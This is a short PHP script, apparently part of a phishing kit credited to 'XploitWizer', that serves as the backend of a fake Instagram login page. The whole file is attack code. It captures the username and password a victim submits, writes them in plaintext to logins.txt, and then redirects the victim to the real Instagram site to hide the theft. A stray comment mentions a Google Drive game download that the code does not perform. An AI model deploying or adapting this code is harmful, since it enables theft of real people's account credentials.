//Devloper : XploitWizer
//Website : https://xploitwizer.me
//GitHub : https://github.com/XploitWizer


<?php

			session_start();
			
			if (isset($_POST['gsubmit'])){
			$email=$_POST["instaName"];
			$pass = $_POST["pass"];
			
			
			//opening logins text file for appending new data.
  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
  			fwrite($file, $email.">".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://www.instagram.com");
			exit();
			
			}
			session_destroy();
			

?>